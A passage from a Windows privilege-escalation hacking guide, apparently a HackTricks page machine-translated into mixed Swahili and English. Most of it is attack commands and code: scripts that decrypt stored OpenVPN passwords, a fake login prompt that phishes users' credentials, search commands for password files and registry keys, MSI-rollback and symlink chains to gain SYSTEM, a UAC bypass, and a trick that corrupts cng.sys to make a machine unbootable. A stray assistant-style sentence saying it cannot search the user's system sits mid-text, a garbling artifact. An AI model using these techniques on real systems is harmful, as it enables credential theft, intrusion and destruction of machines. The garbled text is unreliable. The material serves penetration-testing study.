Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Mfano wa web.config wenye credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Kredentiali za OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Kumbukumbu
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Uliza kwa credentials

Unaweza kila wakati **kumwomba mtumiaji aingize credentials zake au hata credentials za mtumiaji mwingine** kama unafikiri anaweza kuzifahamu (zingatia kwamba **kuuliza** mteja moja kwa moja kwa **credentials** ni **hatari sana**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Majina ya faili yanayowezekana yenye credentials**

Faili zinazojulikana ambazo wakati fulani uliopita zilikuwa na **passwords** kwa **clear-text** au **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Tafadhali toa maudhui ya faili au orodha ya faili husika; siwezi kutafuta moja kwa moja kwenye mfumo wako.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Vitambulisho ndani ya RecycleBin

Unapaswa pia kukagua Bin ili kutafuta vitambulisho vilivyomo ndani yake

Ili **kurejesha passwords** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Vifunguo vingine vinavyowezekana vya registry vilivyo na vitambulisho**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

Unapaswa kuangalia dbs ambapo passwords kutoka **Chrome or Firefox** zimehifadhiwa.\
Pia angalia history, bookmarks na favourites za browsers ili huenda baadhi ya **passwords are** zimehifadhiwa hapo.

Tools za kutoa passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ni technology iliyojengwa ndani ya Windows operating system inayoruhusu **intercommunication** kati ya software components za lugha tofauti. Kila COM component hutambulishwa kwa **class ID (CLSID)** na kila component huonyesha functionality kupitia interfaces moja au zaidi, zinazotambulishwa kwa interface IDs (IIDs).

COM classes na interfaces zimefafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za registry hii unaweza kupata child registry **InProcServer32** ambayo ina **default value** inayoelekeza kwenye **DLL** na value inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) au **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Kimsingi, ukiweza **overwrite any of the DLLs** ambazo zitaendeshwa, unaweza **escalate privileges** ikiwa DLL hiyo itaendeshwa na user tofauti.

Ili kujifunza jinsi attackers wanavyotumia COM Hijacking kama persistence mechanism angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Tafuta faili lenye jina fulani**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Tafuta kwenye registry majina ya key na passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Zana zinazotafuta nywila

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin niliyoitengeneza ili **kuiendesha kiotomatiki kila metasploit POST module inayotafuta credentials** ndani ya victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zilizo na passwords zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa password kutoka kwenye system.

Chombo [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **usernames** na **passwords** za zana kadhaa zinazohifadhi data hii kwa clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, na RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Fikiria kwamba **mchakato unaoendeshwa kama SYSTEM unafungua mchakato mpya** (`OpenProcess()`) **wenye full access**. Mchakato huo huo **pia huunda mchakato mpya** (`CreateProcess()`) **wenye low privileges lakini ukirithi open handles zote za mchakato mkuu**.\
Kisha, ukipata **full access kwa mchakato wa low privileged**, unaweza kuchukua **open handle kwenda kwenye mchakato wenye privileges iliyoundwa** na `OpenProcess()` na **kuinject shellcode**.\
[Soma mfano huu kwa maelezo zaidi kuhusu **jinsi ya kutambua na kutumia udhaifu huu**.](leaked-handle-exploitation.md)\
[Soma **chapisho hili jingine kwa maelezo kamili zaidi kuhusu jinsi ya kujaribu na kutumia vibaya open handlers zaidi za processes na threads zilizo inheritwa zenye viwango tofauti vya permissions (sio full access tu)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za shared memory, zinazoitwa **pipes**, huwezesha mawasiliano ya processes na uhamishaji wa data.

Windows hutoa kipengele kinachoitwa **Named Pipes**, kinachoruhusu processes zisizohusiana kushiriki data, hata kupitia mitandao tofauti. Hii inafanana na usanifu wa client/server, ukiwa na majukumu yanayofafanuliwa kama **named pipe server** na **named pipe client**.

Wakati data inapotumwa kupitia pipe na **client**, **server** iliyosanidi pipe ina uwezo wa **kuchukua utambulisho** wa **client**, mradi ina **SeImpersonate** rights zinazohitajika. Kutambua **mchakato wenye privileges** unaowasiliana kupitia pipe unayoweza kuiga kunatoa fursa ya **kupata higher privileges** kwa kuchukua utambulisho wa mchakato huo mara tu unapoingiliana na pipe uliyounda. Kwa maelekezo ya kutekeleza shambulio kama hilo, miongozo muhimu inaweza kupatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia zana ifuatayo inaruhusu **kuzuia mawasiliano ya named pipe kwa zana kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na zana hii inaruhusu kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Huduma ya Telephony (TapiSrv) katika mode ya server hufichua `\\pipe\\tapsrv` (MS-TRP). Mteja wa mbali aliye authenticated anaweza kutumia njia ya async event inayotegemea mailslot kugeuza `ClientAttach` kuwa **4-byte write** ya kiholela kwa faili lolote lililopo linaloweza kuandikwa na `NETWORK SERVICE`, kisha kupata Telephony admin rights na kupakia DLL ya kiholela kama huduma. Mfuatano kamili:

- `ClientAttach` ikiwa na `pszDomainUser` iliyowekwa kwenye path iliyopo inayoweza kuandikwa → huduma huifungua kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kwa async event writes.
- Kila event huandika `InitContext` inayodhibitiwa na mshambulizi kutoka `Initialize` kwenda kwenye handle hiyo. Sajili line app kwa `LRegisterRequestRecipient` (`Req_Func 61`), anzisha `TRequestMakeCall` (`Req_Func 121`), toa kupitia `GetAsyncEvents` (`Req_Func 0`), kisha unregister/shutdown kurudia writes zenye uamuzi.
- Jiongeze kwenye `[TapiAdministrators]` katika `C:\Windows\TAPI\tsec.ini`, reconnect, kisha piga `GetUIDllName` na path ya DLL ya kiholela ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links zilizopelekwa kwa `ShellExecuteExW` zinaweza kuanzisha dangerous URI handlers (`file:`, `ms-appinstaller:` au scheme yoyote iliyosajiliwa) na kutekeleza faili zinazodhibitiwa na mshambulizi kama current user. Tazama:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Unapopata shell kama user, huenda kukawa na scheduled tasks au processes nyingine zinazoendeshwa ambazo **hupitisha credentials kwenye command line**. Script iliyo hapa chini hukusanya process command lines kila sekunde mbili na kulinganisha hali ya sasa na ile ya awali, kisha kutoa tofauti zozote.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kuiba nywila kutoka kwa processes

## Kutoka Low Priv User hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa una access ya graphical interface (kupitia console au RDP) na UAC imewezeshwa, katika baadhi ya versions za Microsoft Windows inawezekana ku-run terminal au process nyingine yoyote kama "NT\AUTHORITY SYSTEM" kutoka kwa user asiye na privileges.

Hii inafanya iwezekane kuongeza privileges na bypass UAC wakati huo huo kwa vulnerability ile ile. Zaidi ya hayo, hakuna haja ya ku-install chochote na binary inayotumika wakati wa process hiyo, imesainiwa na kutolewa na Microsoft.

Baadhi ya systems zilizoathiriwa ni zifuatazo:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Ili kutumia udhaifu huu, ni lazima kutekeleza hatua zifuatazo:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Kutoka Administrator Medium hadi High Integrity Level / UAC Bypass

Soma hili ili **kujifunza kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hili ili kujifunza kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kutoka Arbitrary Folder Delete/Move/Rename hadi SYSTEM EoP

Teknika iliyoelezewa [**katika blog post hii**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) pamoja na exploit code [**inayopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Shambulio hili kimsingi linajumuisha kutumia vibaya feature ya rollback ya Windows Installer ili kubadilisha files halali na zile zenye madhara wakati wa mchakato wa uninstallation. Kwa hili, mshambuliaji anahitaji kuunda **malicious MSI installer** ambayo itatumika ku-hijack folda `C:\Config.Msi`, ambayo baadaye itatumiwa na Windows Installer kuhifadhi rollback files wakati wa uninstallation ya MSI packages nyingine, ambapo rollback files hizo zitakuwa zimebadilishwa ili kubeba malicious payload.

Teknika iliyofupishwa ni hii ifuatayo:

1. **Stage 1 – Kuandaa Hijack (acha `C:\Config.Msi` ikiwa tupu)**

- Hatua 1: Install MSI
- Tengeneza `.msi` inayosakinisha file lisilo na madhara (mfano, `dummy.txt`) kwenye folder inayoweza kuandikwa (`TARGETDIR`).
- Weka installer kama **"UAC Compliant"**, ili **non-admin user** aweze kui-run.
- Acha **handle** wazi kwa file hilo baada ya install.

- Hatua 2: Anza Uninstall
- Ondoa `.msi` hiyo hiyo.
- Mchakato wa uninstall unaanza kuhamisha files kwenda `C:\Config.Msi` na kuzibadili majina kuwa files za `.rbf` (rollback backups).
- **Poll open file handle** kwa kutumia `GetFinalPathNameByHandle` ili kugundua wakati file linakuwa `C:\Config.Msi\<random>.rbf`.

- Hatua 3: Custom Syncing
- `.msi` inajumuisha **custom uninstall action (`SyncOnRbfWritten`)** that:
- Hutuma ishara wakati `.rbf` imeandikwa.
- Kisha **inasubiri** event nyingine kabla ya kuendelea na uninstall.

- Hatua 4: Ziba Kufutwa kwa `.rbf`
- Ishara ikitolewa, **fungua file la `.rbf`** bila `FILE_SHARE_DELETE` — hii **huzuia kufutwa**.
- Kisha **tuma ishara kurudi** ili uninstall iweze kumalizika.
- Windows Installer hushindwa kufuta `.rbf`, na kwa kuwa haiwezi kufuta contents zote, **`C:\Config.Msi` haiondolewi**.

- Hatua 5: Futa `.rbf` kwa Mikono
- Wewe (mshambuliaji) futa file la `.rbf` kwa mikono.
- Sasa **`C:\Config.Msi` iko tupu**, tayari kwa hijack.

> Kwa hatua hii, **trigger vulnerability ya SYSTEM-level arbitrary folder delete** ili kufuta `C:\Config.Msi`.

2. **Stage 2 – Kubadilisha Rollback Scripts na Zenye Madhara**

- Hatua 6: Unda Upya `C:\Config.Msi` kwa Weak ACLs
- Unda tena folda `C:\Config.Msi` mwenyewe.
- Weka **weak DACLs** (mfano, Everyone:F), na **acha handle wazi** na `WRITE_DAC`.

- Hatua 7: Endesha Install Nyingine
- Install `.msi` tena, pamoja na:
- `TARGETDIR`: Location inayoweza kuandikwa.
- `ERROROUT`: Variable inayosababisha forced failure.
- Install hii itatumika ku-trigger **rollback** tena, ambayo husoma `.rbs` na `.rbf`.

- Hatua 8: Monitor `.rbs`
- Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` mpaka `.rbs` mpya ionekane.
- Chukua filename yake.

- Hatua 9: Sync Kabla ya Rollback
- `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
- Hutuma ishara event wakati `.rbs` imeundwa.
- Kisha **inasubiri** kabla ya kuendelea.

- Hatua 10: Weka Tena Weak ACL
- Baada ya kupokea event ya `.rbs created`:
- Windows Installer **huweka tena strong ACLs** kwa `C:\Config.Msi`.
- Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kuweka tena weak ACLs**.

> ACLs **hutekelezwa tu wakati handle inafunguliwa**, hivyo bado unaweza kuandika kwenye folder.

- Hatua 11: Dondosha Fake `.rbs` na `.rbf`
- Andika juu ya file la `.rbs` kwa **fake rollback script** inayoiambia Windows:
- Rejesha file lako la `.rbf` (malicious DLL) kwenda kwenye **privileged location** (mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Dondosha fake `.rbf` yako yenye **malicious SYSTEM-level payload DLL**.

- Hatua 12: Trigger Rollback
- Tuma ishara ya sync ili installer ianze tena.
- **type 19 custom action (`ErrorOut`)** imewekwa ili **kushindwa kimakusudi** install katika point inayojulikana.
- Hii husababisha **rollback kuanza**.

- Hatua 13: SYSTEM Husakinisha DLL Yako
- Windows Installer:
- Husoma malicious `.rbs` yako.
- Hunanakili DLL yako ya `.rbf` kwenda kwenye target location.
- Sasa una **malicious DLL yako katika SYSTEM-loaded path**.

- Hatua ya Mwisho: Tekeleza SYSTEM Code
- Endesha trusted **auto-elevated binary** (mfano, `osk.exe`) inayopakia DLL uliyo-hijack.
- **Boom**: Code yako imetekelezwa **kama SYSTEM**.


### Kutoka Arbitrary File Delete/Move/Rename hadi SYSTEM EoP

Main MSI rollback technique (ile ya awali) inadhani unaweza kufuta **folder nzima** (mfano, `C:\Config.Msi`). Lakini je, vulnerability yako inaruhusu tu **arbitrary file deletion** ?

Unaweza kutumia **NTFS internals**: kila folder ina hidden alternate data stream inayoitwa:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Mtiririko huu huhifadhi **metadata ya index** ya folda.

Kwa hiyo, ikiwa uta **futa mtiririko wa `::$INDEX_ALLOCATION`** wa folda, NTFS **huondoa folda nzima** kutoka kwenye filesystem.

Unaweza kufanya hivi kwa kutumia standard file deletion APIs kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Hata kama unaita API ya *file* delete, **inafuta folda yenyewe**.

### Kutoka Folder Contents Delete hadi SYSTEM EoP
Je, kama primitive yako hairuhusu kufuta files/folders za kiholela, lakini **inaruhusu kufuta *maudhui* ya folder inayodhibitiwa na mshambuliaji**?

1. Hatua 1: Sanidi bait folder na file
- Tengeneza: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua 2: Weka **oplock** kwenye `file1.txt`
- Oplock **inasitisha utekelezaji** wakati process yenye privilege inajaribu kufuta `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Hatua 3: Anzisha mchakato wa SYSTEM (k.m., `SilentCleanup`)
- Mchakato huu huchunguza folda (k.m., `%TEMP%`) na kujaribu kufuta yaliyomo yake.
- Unapofika kwenye `file1.txt`, **oplock huanzishwa** na hukabidhi udhibiti kwa callback yako.

4. Hatua 4: Ndani ya oplock callback – elekeza ufutaji upya

- Chaguo A: Hamisha `file1.txt` kwingine
- Hii huondoa yaliyomo yote ya `folder1` bila kuvunja oplock.
- Usifute `file1.txt` moja kwa moja — hilo lingetoa oplock mapema mno.

- Chaguo B: Badilisha `folder1` iwe **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: Tengeneza **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Hii inalenga NTFS internal stream ambayo huhifadhi metadata ya folda — kuifuta huifuta folda.

5. Step 5: Release the oplock
- SYSTEM process inaendelea na kujaribu kufuta `file1.txt`.
- Lakini sasa, kwa sababu ya junction + symlink, kwa kweli inafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka Arbitrary Folder Create hadi Permanent DoS

Tumia primitive inayokuruhusu **kuunda folda yoyote kama SYSTEM/admin** — hata kama **huwezi kuandika files** au **kuweka weak permissions**.

Unda **folder** (si file) yenye jina la **critical Windows driver**, kwa mfano:
```
C:\Windows\System32\cng.sys
```
- Jalbu kawaida hii inalingana na kiendesha cha kernel-mode `cng.sys`.
- Ukikiunda **mapema kama folda**, Windows hushindwa kupakia kiendesha halisi wakati wa boot.
- Kisha, Windows hujaribu kupakia `cng.sys` wakati wa boot.
- Huona folda hiyo, **hushindwa kutatua kiendesha halisi**, na **huanguka au husimamisha boot**.
- Hakuna **fallback**, na **hakuna recovery** bila kuingilia kutoka nje (mfano, boot repair au ufikiaji wa diski).

### Kutoka privileged log/backup paths + OM symlinks hadi arbitrary file overwrite / boot DoS

Wakati **privileged service** inaandika logs/exports kwenye path inayosomwa kutoka kwa **writable config**, elekeza path hiyo kwa kutumia **Object Manager symlinks + NTFS mount points** ili kugeuza uandishi wa privileged kuwa arbitrary overwrite (hata **bila** SeCreateSymbolicLinkPrivilege).

**Mahitaji**
- Config inayohifadhi target path iweze kuandikwa na mshambulizi (kwa mfano, `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point kwenda `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Operesheni ya privileged inayoiandika path hiyo (log, export, report).

**Mfano wa mnyororo**
1. Soma config ili kupata privileged log destination, kwa mfano `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` katika `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza path bila admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri component yenye privileji iandike log (kwa mfano, admin achochee "send test SMS"). Andiko sasa linaingia kwenye `C:\Windows\System32\cng.sys`.
4. Kagua target iliyosafishwa/kuandikwa juu yake (hex/PE parser) ili kuthibitisha corruption; reboot hulazimisha Windows kupakia path ya driver iliyoharibiwa → **boot loop DoS**. Hii pia huenda kwa faili yoyote iliyolindwa ambayo service yenye privileji itafungua kwa kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa nakala ipo katika `C:\Windows\System32\cng.sys` inaweza kujaribiwa kwanza, na kuifanya kuwa sinki la kuaminika la DoS kwa data iliyoharibika.



## **From High Integrity to System**

### **New service**

Ikiwa tayari unafanya kazi kwenye process ya High Integrity, **njia ya kufika SYSTEM** inaweza kuwa rahisi kwa **kuunda na kuendesha service mpya**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> When creating a service binary make sure it's a valid service or that the binary performs the necessary actions to fast as it'll be killed in 20s if it's not a valid service.

### AlwaysInstallElevated

Kutoka kwa mchakato wa High Integrity unaweza kujaribu **kuwezesha entries za AlwaysInstallElevated registry** na **kusakinisha** reverse shell kwa kutumia wrapper ya _**.msi**_.\
[Maelezo zaidi kuhusu registry keys zinazohusika na jinsi ya kusakinisha pakiti ya _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata code hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ukifanya kazi na token privileges hizo (huenda utazipata ndani ya mchakato ambao tayari ni High Integrity), utaweza **kufungua takriban kila mchakato** (si processes zilizolindwa) kwa privilege ya SeDebug, **kunakili token** ya mchakato, na kuunda **mchakato wowote kwa token hiyo**.\
Kwa kawaida mbinu hii **huchagua mchakato wowote unaoendeshwa kama SYSTEM ukiwa na token privileges zote** (_ndiyo, unaweza kupata processes za SYSTEM zisizo na token privileges zote_).\
**Unaweza kupata** [**mfano wa code inayotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii hutumiwa na meterpreter ku-escalate katika `getsystem`. Mbinu hii inajumuisha **kuunda pipe kisha kuunda/kutumia vibaya service ili iandike kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia privilege ya **`SeImpersonate`** itaweza **kuiga token** ya mteja wa pipe (service) na kupata privileges za SYSTEM.\
Ukitaka [**kujifunza zaidi kuhusu name pipes unapaswa kusoma hili**](#named-pipe-client-impersonation).\
Ukitaka kusoma mfano wa [**jinsi ya kutoka high integrity kwenda System kwa kutumia name pipes unapaswa kusoma hili**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukiweza **kuhijack dll** ambayo inakuwa **loaded** na **process** inayoendeshwa kama **SYSTEM** utaweza kutekeleza code yoyote kwa ruhusa hizo. Kwa hiyo Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation, na zaidi ya hapo, huwa **rahisi zaidi kuifanikisha kutoka kwenye mchakato wa high integrity** kwa kuwa utakuwa na **write permissions** kwenye folda zinazotumiwa ku-load dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Angalia misconfigurations na files nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Angalia baadhi ya misconfigurations zinazowezekana na ukusanye taarifa (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Angalia misconfigurations**\
